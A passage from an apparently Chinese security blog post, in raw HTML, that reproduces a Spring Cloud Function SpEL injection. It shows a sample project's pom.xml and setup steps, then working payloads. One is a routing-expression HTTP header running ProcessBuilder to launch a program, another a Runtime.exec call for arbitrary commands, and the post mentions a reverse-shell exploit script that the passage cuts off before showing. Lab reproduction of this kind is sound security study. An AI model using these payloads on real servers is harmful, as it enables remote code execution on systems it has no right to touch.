</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">113
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">114
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">115
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">116
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">117
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">118
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">119
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">120
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">121
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">122
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">123
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">124
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">125
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">126
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">127
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">128
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">129
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">130
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">131
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">132
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">133
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">134
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">135
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">136
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">137
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">138
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">139
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">140
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">141
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">142
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">143
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">144
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">145
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">146
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">147
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">148
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">149
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">150
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span style="display:flex;"><span><span style="font-weight:bold">&lt;project</span> <span style="color:#007f7f">xmlns:xsi=</span><span style="color:#0ff;font-weight:bold">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>
</span></span><span style="display:flex;"><span>		 <span style="color:#007f7f">xmlns=</span><span style="color:#0ff;font-weight:bold">&#34;http://maven.apache.org/POM/4.0.0&#34;</span>
</span></span><span style="display:flex;"><span>		 <span style="color:#007f7f">xsi:schemaLocation=</span><span style="color:#0ff;font-weight:bold">&#34;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&#34;</span><span style="font-weight:bold">&gt;</span>
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&lt;modelVersion&gt;</span>4.0.0<span style="font-weight:bold">&lt;/modelVersion&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&lt;groupId&gt;</span>io.spring.sample<span style="font-weight:bold">&lt;/groupId&gt;</span>
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&lt;artifactId&gt;</span>function-sample-pojo<span style="font-weight:bold">&lt;/artifactId&gt;</span>
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&lt;version&gt;</span>3.2.1.RELEASE<span style="font-weight:bold">&lt;/version&gt;</span>
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&lt;packaging&gt;</span>jar<span style="font-weight:bold">&lt;/packaging&gt;</span>
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&lt;name&gt;</span>function-sample-pojo<span style="font-weight:bold">&lt;/name&gt;</span>
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&lt;description&gt;</span>Spring Cloud Function Web Support<span style="font-weight:bold">&lt;/description&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&lt;parent&gt;</span>
</span></span><span style="display:flex;"><span>		<span style="font-weight:bold">&lt;groupId&gt;</span>org.springframework.boot<span style="font-weight:bold">&lt;/groupId&gt;</span>
</span></span><span style="display:flex;"><span>		<span style="font-weight:bold">&lt;artifactId&gt;</span>spring-boot-starter-parent<span style="font-weight:bold">&lt;/artifactId&gt;</span>
</span></span><span style="display:flex;"><span>		<span style="font-weight:bold">&lt;version&gt;</span>3.0.0-SNAPSHOT<span style="font-weight:bold">&lt;/version&gt;</span>
</span></span><span style="display:flex;"><span>		<span style="font-weight:bold">&lt;relativePath/&gt;</span>
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&lt;/parent&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&lt;properties&gt;</span>
</span></span><span style="display:flex;"><span>		<span style="font-weight:bold">&lt;spring-cloud-function.version&gt;</span>3.2.1-SNAPSHOT<span style="font-weight:bold">&lt;/spring-cloud-function.version&gt;</span>
</span></span><span style="display:flex;"><span>		<span style="font-weight:bold">&lt;wrapper.version&gt;</span>1.0.27.RELEASE<span style="font-weight:bold">&lt;/wrapper.version&gt;</span>
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&lt;/properties&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&lt;dependencies&gt;</span>
</span></span><span style="display:flex;"><span>		<span style="font-weight:bold">&lt;dependency&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="font-weight:bold">&lt;groupId&gt;</span>org.springframework.cloud<span style="font-weight:bold">&lt;/groupId&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="font-weight:bold">&lt;artifactId&gt;</span>spring-cloud-starter-function-webflux<span style="font-weight:bold">&lt;/artifactId&gt;</span>
</span></span><span style="display:flex;"><span>		<span style="font-weight:bold">&lt;/dependency&gt;</span>
</span></span><span style="display:flex;"><span>		<span style="font-weight:bold">&lt;dependency&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="font-weight:bold">&lt;groupId&gt;</span>org.springframework.boot<span style="font-weight:bold">&lt;/groupId&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="font-weight:bold">&lt;artifactId&gt;</span>spring-boot-configuration-processor<span style="font-weight:bold">&lt;/artifactId&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="font-weight:bold">&lt;optional&gt;</span>true<span style="font-weight:bold">&lt;/optional&gt;</span>
</span></span><span style="display:flex;"><span>		<span style="font-weight:bold">&lt;/dependency&gt;</span>
</span></span><span style="display:flex;"><span>		<span style="font-weight:bold">&lt;dependency&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="font-weight:bold">&lt;groupId&gt;</span>org.springframework.boot<span style="font-weight:bold">&lt;/groupId&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="font-weight:bold">&lt;artifactId&gt;</span>spring-boot-starter-test<span style="font-weight:bold">&lt;/artifactId&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="font-weight:bold">&lt;scope&gt;</span>test<span style="font-weight:bold">&lt;/scope&gt;</span>
</span></span><span style="display:flex;"><span>		<span style="font-weight:bold">&lt;/dependency&gt;</span>
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&lt;/dependencies&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&lt;dependencyManagement&gt;</span>
</span></span><span style="display:flex;"><span>		<span style="font-weight:bold">&lt;dependencies&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="font-weight:bold">&lt;dependency&gt;</span>
</span></span><span style="display:flex;"><span>				<span style="font-weight:bold">&lt;groupId&gt;</span>org.springframework.cloud<span style="font-weight:bold">&lt;/groupId&gt;</span>
</span></span><span style="display:flex;"><span>				<span style="font-weight:bold">&lt;artifactId&gt;</span>spring-cloud-function-dependencies<span style="font-weight:bold">&lt;/artifactId&gt;</span>
</span></span><span style="display:flex;"><span>				<span style="font-weight:bold">&lt;version&gt;</span>${spring-cloud-function.version}<span style="font-weight:bold">&lt;/version&gt;</span>
</span></span><span style="display:flex;"><span>				<span style="font-weight:bold">&lt;type&gt;</span>pom<span style="font-weight:bold">&lt;/type&gt;</span>
</span></span><span style="display:flex;"><span>				<span style="font-weight:bold">&lt;scope&gt;</span>import<span style="font-weight:bold">&lt;/scope&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="font-weight:bold">&lt;/dependency&gt;</span>
</span></span><span style="display:flex;"><span>		<span style="font-weight:bold">&lt;/dependencies&gt;</span>
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&lt;/dependencyManagement&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&lt;build&gt;</span>
</span></span><span style="display:flex;"><span>		<span style="font-weight:bold">&lt;plugins&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="font-weight:bold">&lt;plugin&gt;</span>
</span></span><span style="display:flex;"><span>				<span style="font-weight:bold">&lt;groupId&gt;</span>org.apache.maven.plugins<span style="font-weight:bold">&lt;/groupId&gt;</span>
</span></span><span style="display:flex;"><span>				<span style="font-weight:bold">&lt;artifactId&gt;</span>maven-deploy-plugin<span style="font-weight:bold">&lt;/artifactId&gt;</span>
</span></span><span style="display:flex;"><span>				<span style="font-weight:bold">&lt;configuration&gt;</span>
</span></span><span style="display:flex;"><span>					<span style="font-weight:bold">&lt;skip&gt;</span>true<span style="font-weight:bold">&lt;/skip&gt;</span>
</span></span><span style="display:flex;"><span>				<span style="font-weight:bold">&lt;/configuration&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="font-weight:bold">&lt;/plugin&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="font-weight:bold">&lt;plugin&gt;</span>
</span></span><span style="display:flex;"><span>				<span style="font-weight:bold">&lt;groupId&gt;</span>org.springframework.boot<span style="font-weight:bold">&lt;/groupId&gt;</span>
</span></span><span style="display:flex;"><span>				<span style="font-weight:bold">&lt;artifactId&gt;</span>spring-boot-maven-plugin<span style="font-weight:bold">&lt;/artifactId&gt;</span>
</span></span><span style="display:flex;"><span>				<span style="font-weight:bold">&lt;dependencies&gt;</span>
</span></span><span style="display:flex;"><span>					<span style="font-weight:bold">&lt;dependency&gt;</span>
</span></span><span style="display:flex;"><span>						<span style="font-weight:bold">&lt;groupId&gt;</span>org.springframework.boot.experimental<span style="font-weight:bold">&lt;/groupId&gt;</span>
</span></span><span style="display:flex;"><span>						<span style="font-weight:bold">&lt;artifactId&gt;</span>spring-boot-thin-layout<span style="font-weight:bold">&lt;/artifactId&gt;</span>
</span></span><span style="display:flex;"><span>						<span style="font-weight:bold">&lt;version&gt;</span>${wrapper.version}<span style="font-weight:bold">&lt;/version&gt;</span>
</span></span><span style="display:flex;"><span>					<span style="font-weight:bold">&lt;/dependency&gt;</span>
</span></span><span style="display:flex;"><span>				<span style="font-weight:bold">&lt;/dependencies&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="font-weight:bold">&lt;/plugin&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="font-weight:bold">&lt;plugin&gt;</span>
</span></span><span style="display:flex;"><span>				<span style="font-weight:bold">&lt;artifactId&gt;</span>maven-surefire-plugin<span style="font-weight:bold">&lt;/artifactId&gt;</span>
</span></span><span style="display:flex;"><span>				<span style="font-weight:bold">&lt;configuration&gt;</span>
</span></span><span style="display:flex;"><span>					<span style="font-weight:bold">&lt;includes&gt;</span>
</span></span><span style="display:flex;"><span>						<span style="font-weight:bold">&lt;include&gt;</span>**/*Tests.java<span style="font-weight:bold">&lt;/include&gt;</span>
</span></span><span style="display:flex;"><span>						<span style="font-weight:bold">&lt;include&gt;</span>**/*Test.java<span style="font-weight:bold">&lt;/include&gt;</span>
</span></span><span style="display:flex;"><span>					<span style="font-weight:bold">&lt;/includes&gt;</span>
</span></span><span style="display:flex;"><span>					<span style="font-weight:bold">&lt;excludes&gt;</span>
</span></span><span style="display:flex;"><span>						<span style="font-weight:bold">&lt;exclude&gt;</span>**/Abstract*.java<span style="font-weight:bold">&lt;/exclude&gt;</span>
</span></span><span style="display:flex;"><span>					<span style="font-weight:bold">&lt;/excludes&gt;</span>
</span></span><span style="display:flex;"><span>				<span style="font-weight:bold">&lt;/configuration&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="font-weight:bold">&lt;/plugin&gt;</span>
</span></span><span style="display:flex;"><span>		<span style="font-weight:bold">&lt;/plugins&gt;</span>
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&lt;/build&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&lt;repositories&gt;</span>
</span></span><span style="display:flex;"><span>		<span style="font-weight:bold">&lt;repository&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="font-weight:bold">&lt;id&gt;</span>spring-snapshots<span style="font-weight:bold">&lt;/id&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="font-weight:bold">&lt;name&gt;</span>Spring Snapshots<span style="font-weight:bold">&lt;/name&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="font-weight:bold">&lt;url&gt;</span>https://repo.spring.io/libs-snapshot-local<span style="font-weight:bold">&lt;/url&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="font-weight:bold">&lt;snapshots&gt;</span>
</span></span><span style="display:flex;"><span>				<span style="font-weight:bold">&lt;enabled&gt;</span>true<span style="font-weight:bold">&lt;/enabled&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="font-weight:bold">&lt;/snapshots&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="font-weight:bold">&lt;releases&gt;</span>
</span></span><span style="display:flex;"><span>				<span style="font-weight:bold">&lt;enabled&gt;</span>false<span style="font-weight:bold">&lt;/enabled&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="font-weight:bold">&lt;/releases&gt;</span>
</span></span><span style="display:flex;"><span>		<span style="font-weight:bold">&lt;/repository&gt;</span>
</span></span><span style="display:flex;"><span>		<span style="font-weight:bold">&lt;repository&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="font-weight:bold">&lt;id&gt;</span>spring-milestones<span style="font-weight:bold">&lt;/id&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="font-weight:bold">&lt;name&gt;</span>Spring Milestones<span style="font-weight:bold">&lt;/name&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="font-weight:bold">&lt;url&gt;</span>https://repo.spring.io/libs-milestone-local<span style="font-weight:bold">&lt;/url&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="font-weight:bold">&lt;snapshots&gt;</span>
</span></span><span style="display:flex;"><span>				<span style="font-weight:bold">&lt;enabled&gt;</span>false<span style="font-weight:bold">&lt;/enabled&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="font-weight:bold">&lt;/snapshots&gt;</span>
</span></span><span style="display:flex;"><span>		<span style="font-weight:bold">&lt;/repository&gt;</span>
</span></span><span style="display:flex;"><span>		<span style="font-weight:bold">&lt;repository&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="font-weight:bold">&lt;id&gt;</span>spring-releases<span style="font-weight:bold">&lt;/id&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="font-weight:bold">&lt;name&gt;</span>Spring Releases<span style="font-weight:bold">&lt;/name&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="font-weight:bold">&lt;url&gt;</span>https://repo.spring.io/release<span style="font-weight:bold">&lt;/url&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="font-weight:bold">&lt;snapshots&gt;</span>
</span></span><span style="display:flex;"><span>				<span style="font-weight:bold">&lt;enabled&gt;</span>false<span style="font-weight:bold">&lt;/enabled&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="font-weight:bold">&lt;/snapshots&gt;</span>
</span></span><span style="display:flex;"><span>		<span style="font-weight:bold">&lt;/repository&gt;</span>
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&lt;/repositories&gt;</span>
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&lt;pluginRepositories&gt;</span>
</span></span><span style="display:flex;"><span>		<span style="font-weight:bold">&lt;pluginRepository&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="font-weight:bold">&lt;id&gt;</span>spring-snapshots<span style="font-weight:bold">&lt;/id&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="font-weight:bold">&lt;name&gt;</span>Spring Snapshots<span style="font-weight:bold">&lt;/name&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="font-weight:bold">&lt;url&gt;</span>https://repo.spring.io/libs-snapshot-local<span style="font-weight:bold">&lt;/url&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="font-weight:bold">&lt;snapshots&gt;</span>
</span></span><span style="display:flex;"><span>				<span style="font-weight:bold">&lt;enabled&gt;</span>true<span style="font-weight:bold">&lt;/enabled&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="font-weight:bold">&lt;/snapshots&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="font-weight:bold">&lt;releases&gt;</span>
</span></span><span style="display:flex;"><span>				<span style="font-weight:bold">&lt;enabled&gt;</span>false<span style="font-weight:bold">&lt;/enabled&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="font-weight:bold">&lt;/releases&gt;</span>
</span></span><span style="display:flex;"><span>		<span style="font-weight:bold">&lt;/pluginRepository&gt;</span>
</span></span><span style="display:flex;"><span>		<span style="font-weight:bold">&lt;pluginRepository&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="font-weight:bold">&lt;id&gt;</span>spring-milestones<span style="font-weight:bold">&lt;/id&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="font-weight:bold">&lt;name&gt;</span>Spring Milestones<span style="font-weight:bold">&lt;/name&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="font-weight:bold">&lt;url&gt;</span>https://repo.spring.io/libs-milestone-local<span style="font-weight:bold">&lt;/url&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="font-weight:bold">&lt;snapshots&gt;</span>
</span></span><span style="display:flex;"><span>				<span style="font-weight:bold">&lt;enabled&gt;</span>false<span style="font-weight:bold">&lt;/enabled&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="font-weight:bold">&lt;/snapshots&gt;</span>
</span></span><span style="display:flex;"><span>		<span style="font-weight:bold">&lt;/pluginRepository&gt;</span>
</span></span><span style="display:flex;"><span>		<span style="font-weight:bold">&lt;pluginRepository&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="font-weight:bold">&lt;id&gt;</span>spring-releases<span style="font-weight:bold">&lt;/id&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="font-weight:bold">&lt;name&gt;</span>Spring Releases<span style="font-weight:bold">&lt;/name&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="font-weight:bold">&lt;url&gt;</span>https://repo.spring.io/libs-release-local<span style="font-weight:bold">&lt;/url&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="font-weight:bold">&lt;snapshots&gt;</span>
</span></span><span style="display:flex;"><span>				<span style="font-weight:bold">&lt;enabled&gt;</span>false<span style="font-weight:bold">&lt;/enabled&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="font-weight:bold">&lt;/snapshots&gt;</span>
</span></span><span style="display:flex;"><span>		<span style="font-weight:bold">&lt;/pluginRepository&gt;</span>
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&lt;/pluginRepositories&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="font-weight:bold">&lt;/project&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20220630012423909.png" alt="image-20220630012423909"  />
</p>
</li>
<li>
<p>建立一个配置类，用于实现字符串小写</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20220627223937035.png" alt="image-20220627223937035"  />
</li>
</ul>
</li>
<li>
<p>在<code>applications.properties</code>中写入<code>spring.cloud.function.definition:functionRouter</code></p>
<ul>
<li>如果设置为functionRouter则默认路由绑定的具体函数<strong>交由用户进行控制</strong>，在 Spring Cloud Function Web里面，可以通过设置http头的方式来控制，使用<code>spring.cloud.function.definition</code> 和<code>spring.cloud.function.routing-expression</code> 都可以，区别是后者允许使用Spring表达式语言<code>（SpEL）</code>。</li>
</ul>
</li>
<li>
<p>开启<code>8090</code>端口</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20220630012534052.png" alt="image-20220630012534052"  />
</li>
</ul>
</li>
</ul>
<h2 id="漏洞复现">漏洞复现<a hidden class="anchor" aria-hidden="true" href="#漏洞复现">#</a></h2>
<ul>
<li>
<p>在HTTP请求头加入<code>spring.cloud.function.routing-expression:</code></p>
</li>
<li>
<p><code>payload</code>:<code>spring.cloud.function.routing-expression: new ProcessBuilder('/System/Applications/Calculator.app/Contents/MacOS/Calculator').start()</code></p>
</li>
<li>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20220627224258854.png" alt="image-20220627224258854"  />
</p>
</li>
<li>
<p>同时也可以通过<code>T(java.lang.Runtime).getRuntime().exec(&quot;cmd&quot;)</code>来执行任意命令执行</p>
<ul>
<li>但是这种命令执行没有回显。</li>
</ul>
</li>
<li>
<p><code>exp脚本</code></p>
<ul>
<li><code>exp</code>实际上就是封装好我们我们需要发送的数据包，带上我们的恶意参数头。</li>
<li>实际上，这个<code>exp</code>也可以执行其他命令，只需要更改发送数据包的<code>payload</code>即可，下面的反弹<code>shell</code>就会用到该脚本。</li>
</ul>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">33
